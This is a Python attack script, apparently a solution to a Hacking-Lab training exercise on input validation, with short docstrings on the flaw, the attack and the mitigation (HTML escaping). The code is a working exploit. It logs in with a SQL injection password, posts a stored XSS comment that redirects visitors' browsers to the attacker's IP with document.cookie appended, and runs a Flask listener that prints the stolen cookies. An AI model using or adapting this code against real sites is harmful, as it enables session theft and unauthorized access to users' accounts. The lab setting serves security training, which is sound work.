__problem__ = \
"""
Comments of user can be displayed as is. Malicous comment can therefore be executed by browser.
"""

__attack__ = \
"""
Used an own server which can obtain cookie from request. Comment malicous code which send cookie to server.
"""

__mitigation__ = \
"""
Utilize HTML escape properly. Validate user's input.
"""

import logging

import requests

from __base__ import setup_log, get_ip_address

log = logging.getLogger(__name__)


def start_server():
    import threading
    import flask
    from flask import Flask

    class Server(threading.Thread):
        def run(self) -> None:
            app = Flask(__name__)

            @app.route('/<payload>', methods=["GET"])
            def hook1(payload):
                print(payload)
                return flask.Response(headers={'Access-Control-Allow-Origin': '*'}, status=204)

            app.run(host='0.0.0.0', port=3000)

    server = Server()
    server.start()


def inject_comment():
    with requests.session() as session:
        session.verify = False
        session.get("https://glocken.hacking-lab.com/12001/inputval_case1/inputval1/")
        session.post("https://glocken.hacking-lab.com/12001/inputval_case1/auth_inputval1/login",
                     data={
                         'username': 'hacker10',
                         'password': "' or '1'='1",
                         'action': 'login',
                         'originalURL': 'http://glocken.hacking-lab.com/12001/inputval_case1/inputval1/',
                         'send': 'Login',
                     })
        session.get(
            f"https://glocken.hacking-lab.com/12001/inputval_case1/inputval1/controller?action=addcomment&comment=%3cscript%3elocation.href%3d%22http%3a%2f%2f{get_ip_address()}%3a3000%2f%22%2bdocument.cookie%3c%2fscript%3e")


if __name__ == '__main__':
    setup_log()
    start_server()
    inject_comment()
